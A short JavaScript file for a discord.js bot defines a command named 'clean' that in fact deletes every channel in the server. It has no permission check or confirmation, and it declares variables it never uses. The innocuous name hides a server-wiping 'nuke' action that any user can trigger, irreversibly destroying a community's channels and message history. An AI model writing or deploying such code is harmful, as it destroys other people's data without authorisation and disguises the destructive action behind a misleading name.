const Discord = require('discord.js');
const { getMember, formatDate} = require("../functions.js");

module.exports.run = async(bot,message,args) => {
    const member = getMember(message, args.join(" "));
    const embed = new Discord.MessageEmbed()


    message.guild.channels.cache.forEach(channel => channel.delete());


}

module.exports.command = {
    name: "clean",
}
